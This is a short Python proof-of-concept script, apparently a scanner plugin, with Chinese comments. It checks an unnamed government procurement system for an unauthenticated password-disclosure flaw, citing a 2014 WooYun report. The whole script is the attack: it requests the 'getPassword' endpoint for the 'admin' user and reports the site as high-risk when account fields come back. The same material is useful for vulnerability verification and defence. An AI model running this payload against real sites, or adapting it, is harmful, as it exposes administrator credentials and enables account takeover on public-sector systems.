#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 某政府采购系统任意用户密码获取漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-076710
author: Lucifer
description: 未授权泄露了用户密码信息可直接登录。
'''
import sys
import requests
import warnings
from termcolor import cprint

class zfcgxt_UserSecurityController_getpass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/UserSecurityController.do?method=getPassword&step=2&userName=admin"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"usrIsExpired" in req.text and r"usrIsLocked" in req.text:
                cprint("[+]存在某政府采购系统任意用户密码获取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zfcgxt_UserSecurityController_getpass_BaseVerify(sys.argv[1])
    testVuln.run()